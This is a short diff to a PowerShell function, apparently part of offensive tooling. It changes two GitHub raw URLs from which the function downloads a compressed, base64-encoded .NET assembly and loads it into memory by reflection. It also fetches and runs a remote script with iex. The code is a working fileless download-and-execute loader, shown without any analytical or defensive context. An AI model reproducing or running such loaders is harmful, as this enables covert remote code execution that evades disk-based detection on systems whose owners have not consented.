@@ -300,13 +300,13 @@ function lol{
 	}
     
     $x = [string[]]$vars.ToArray()
-    $b = (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/1/master/64")
+    $b = (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/custom-ingestor/master/64")
     $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($b),[IO.Compression.CompressionMode]::Decompress)
     $c = New-Object Byte[](833536)
     $DeflatedStream.Read($c, 0, 833536) | Out-Null
     $Assembly = [Reflection.Assembly]::Load($c)
     $BindingFlags = [Reflection.BindingFlags] "Public,Static"
     $a = @()
-    iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/1/master/1.ps1")
+    iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/f3ci/custom-ingestor/master/1.ps1")
 	
 }
